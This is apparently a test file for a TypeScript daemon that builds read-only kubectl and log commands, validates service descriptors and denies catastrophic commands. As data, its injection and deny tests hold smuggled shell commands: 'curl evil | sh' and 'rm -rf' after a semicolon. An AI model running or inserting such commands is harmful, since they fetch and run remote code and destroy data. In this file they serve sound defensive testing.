import { describe, expect, test } from "bun:test";
import { mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { spawnPty } from "../src/pty";
import { Registry } from "../src/registry";
import {
  type AuditEntry,
  buildLogs,
  buildState,
  CommandError,
  type DispatchDeps,
  dispatch,
  SessionPool,
  shellQuote,
} from "../src/daemon";
import type { EnvDescriptor, ServiceDescriptor } from "../src/types";
import type { RpcRequest, RpcResponse } from "../src/daemon";

// ---- command builders (pure) ----

const k8sSvc: ServiceDescriptor = {
  name: "order-svc",
  runtime: "jvm",
  locate: { k8s: { namespace: "order", selector: "app=order-svc" } },
};
const fileSvc: ServiceDescriptor = {
  name: "order-svc",
  runtime: "jvm",
  logs: { file: "/var/log/order/order-svc.log" },
  locate: { pid: "pgrep -f order-svc.jar" },
};

describe("command builders", () => {
  test("shellQuote escapes single quotes", () => {
    expect(shellQuote("a'b")).toBe(`'a'\\''b'`);
  });

  test("buildLogs k8s (constructed) bounds tail + bytes", () => {
    const cmd = buildLogs(k8sSvc, "k8s", { tail: 50, since: "5m" });
    expect(cmd).toContain("kubectl -n 'order' logs -l 'app=order-svc' --tail=50");
    expect(cmd).toContain("--since='5m'");
    expect(cmd).toContain("| head -c 200000");
  });

  test("buildLogs k8s with grep pipes a remote grep", () => {
    const cmd = buildLogs(k8sSvc, "k8s", { grep: "ERROR" });
    expect(cmd).toContain("| grep -- 'ERROR'");
  });

  test("buildLogs k8s honors a read-only logs.k8s template with placeholders", () => {
    const svc: ServiceDescriptor = {
      ...k8sSvc,
      logs: { k8s: "kubectl -n order logs -l app=x --tail={{tail}} --since={{since}}" },
    };
    expect(buildLogs(svc, "k8s", { tail: 10, since: "2h" })).toContain(
      "kubectl -n order logs -l app=x --tail=10 --since=2h",
    );
  });

  test("buildLogs/buildState reject a non-read-only descriptor command (injection)", () => {
    const evil: ServiceDescriptor = {
      name: "x",
      runtime: "jvm",
      logs: { k8s: "kubectl logs x; rm -rf /tmp/y" },
      locate: { pid: "echo 1; curl evil | sh" },
    };
    expect(() => buildLogs(evil, "k8s")).toThrow(CommandError);
    expect(() => buildState(evil, "proprietary")).toThrow(CommandError);
  });

  test("buildLogs proprietary uses the file + grep", () => {
    expect(buildLogs(fileSvc, "proprietary", { tail: 100 })).toBe(
      "tail -n 100 '/var/log/order/order-svc.log' | head -c 200000",
    );
    expect(buildLogs(fileSvc, "proprietary", { grep: "ERR" })).toContain(
      "grep -n -- 'ERR' '/var/log/order/order-svc.log' | tail -n 200",
    );
  });

  test("buildLogs throws when a source is missing", () => {
    const bad: ServiceDescriptor = { name: "x", runtime: "go" };
    expect(() => buildLogs(bad, "k8s")).toThrow(CommandError);
    expect(() => buildLogs(bad, "proprietary")).toThrow(CommandError);
  });

  test("buildState k8s + proprietary", () => {
    expect(buildState(k8sSvc, "k8s")).toBe(
      "kubectl -n 'order' get pods -l 'app=order-svc' -o wide",
    );
    expect(buildState(fileSvc, "proprietary")).toBe("pgrep -f order-svc.jar | head -n 50");
  });
});

// ---- dispatch (integration over a real local bash "env") ----

function localFactory() {
  return () =>
    spawnPty(["bash", "--norc", "--noprofile"], {
      env: { PATH: process.env.PATH ?? "", HOME: process.env.HOME ?? "/tmp", LANG: "C" },
    });
}

function setup(logFile: string) {
  const registry = new Registry(":memory:");
  const env: EnvDescriptor = {
    id: "envX",
    form: "proprietary",
    bastion: { host: "h", loginUser: "low", auth: { type: "password", secretRef: "low" } },
    services: [
      { name: "svc", runtime: "jvm", logs: { file: logFile }, locate: { pid: "echo 4242" } },
    ],
  };
  registry.upsertEnv(env);
  const pool = new SessionPool(registry, () => localFactory(), {
    syncTimeoutMs: 5000,
    commandTimeoutMs: 5000,
  });
  const audit: AuditEntry[] = [];
  const deps: DispatchDeps = { registry, pool, audit: (e) => audit.push(e), now: () => 123 };
  return { registry, pool, deps, audit };
}

const REQ = (method: RpcRequest["method"], params?: Record<string, unknown>): RpcRequest => ({
  id: 1,
  method,
  params,
});
function ok<T = unknown>(r: RpcResponse): T {
  if (!r.ok) throw new Error(`expected ok, got error: ${r.error}`);
  return r.result as T;
}

describe("dispatch", () => {
  test("ping", async () => {
    const { deps, pool } = setup("/dev/null");
    expect(ok<{ pong: boolean }>(await dispatch(deps, REQ("ping")))).toEqual({ pong: true });
    await pool.releaseAll();
  });

  test("env.list / env.use / env.current", async () => {
    const { deps, pool } = setup("/dev/null");
    expect(
      ok<{ environments: unknown[] }>(await dispatch(deps, REQ("env.list"))).environments,
    ).toHaveLength(1);
    expect(ok<{ current: string }>(await dispatch(deps, REQ("env.use", { id: "envX" })))).toEqual({
      current: "envX",
    });
    expect(ok<{ current: string | null }>(await dispatch(deps, REQ("env.current")))).toEqual({
      current: "envX",
    });
    const bad = await dispatch(deps, REQ("env.use", { id: "nope" }));
    expect(bad.ok).toBe(false);
    await pool.releaseAll();
  });

  test("logs reads the file via the built command", async () => {
    const dir = mkdtempSync(join(tmpdir(), "lantern-d-"));
    const logFile = join(dir, "app.log");
    writeFileSync(logFile, "line1\nERROR boom\nline3\n");
    const { deps, pool } = setup(logFile);
    try {
      const all = ok<{ stdout: string }>(
        await dispatch(deps, REQ("logs", { envId: "envX", service: "svc" })),
      );
      expect(all.stdout).toContain("ERROR boom");
      expect(all.stdout).toContain("line1");
      const grepped = ok<{ stdout: string }>(
        await dispatch(deps, REQ("logs", { envId: "envX", service: "svc", grep: "ERROR" })),
      );
      expect(grepped.stdout).toContain("ERROR boom");
      expect(grepped.stdout).not.toContain("line1");
    } finally {
      await pool.releaseAll();
      rmSync(dir, { recursive: true, force: true });
    }
  });

  test("state runs the locate command", async () => {
    const { deps, pool } = setup("/dev/null");
    try {
      const r = ok<{ stdout: string }>(
        await dispatch(deps, REQ("state", { envId: "envX", service: "svc" })),
      );
      expect(r.stdout.trim()).toBe("4242");
    } finally {
      await pool.releaseAll();
    }
  });

  test("exec runs a read command and reports the verdict + audit", async () => {
    const { deps, pool, audit } = setup("/dev/null");
    try {
      const r = ok<{ stdout: string; verdict: string; exitCode: number }>(
        await dispatch(deps, REQ("exec", { envId: "envX", command: "echo hi" })),
      );
      expect(r.stdout).toBe("hi");
      expect(r.verdict).toBe("read");
      expect(r.exitCode).toBe(0);
      expect(audit.at(-1)).toMatchObject({
        envId: "envX",
        method: "exec",
        verdict: "read",
        ts: 123,
      });
    } finally {
      await pool.releaseAll();
    }
  });

  test("exec refuses catastrophic commands (deny backstop)", async () => {
    const { deps, pool, audit } = setup("/dev/null");
    try {
      const r = await dispatch(deps, REQ("exec", { envId: "envX", command: "rm -rf /tmp/x" }));
      expect(r.ok).toBe(false);
      if (!r.ok) expect(r.error).toContain("catastrophic");
      expect(audit.at(-1)).toMatchObject({ verdict: "deny" });
    } finally {
      await pool.releaseAll();
    }
  });

  test("exec without a selected env errors", async () => {
    const { deps, pool } = setup("/dev/null");
    const r = await dispatch(deps, REQ("exec", { command: "echo hi" }));
    expect(r.ok).toBe(false);
    if (!r.ok) expect(r.error).toContain("no environment selected");
    await pool.releaseAll();
  });

  test("SessionPool.get throws on unknown env", () => {
    const registry = new Registry(":memory:");
    const pool = new SessionPool(registry, () => localFactory());
    expect(() => pool.get("ghost")).toThrow(/unknown environment/);
  });

  test("env.add registers a descriptor + secrets (validated)", async () => {
    const registry = new Registry(":memory:");
    const pool = new SessionPool(registry, () => localFactory());
    const deps: DispatchDeps = { registry, pool };
    const env: EnvDescriptor = {
      id: "envNew",
      form: "k8s",
      bastion: { host: "h", loginUser: "low", auth: { type: "password", secretRef: "envNew/low" } },
    };
    const r = await dispatch(deps, REQ("env.add", { env, secrets: { "envNew/low": "pw-low" } }));
    expect(r.ok).toBe(true);
    expect(registry.getEnv("envNew")?.id).toBe("envNew");
    expect(registry.getSecret("envNew/low")).toBe("pw-low");

    // invalid descriptor is rejected
    const bad = await dispatch(deps, REQ("env.add", { env: { id: "x" } }));
    expect(bad.ok).toBe(false);
    await pool.releaseAll();
  });
});
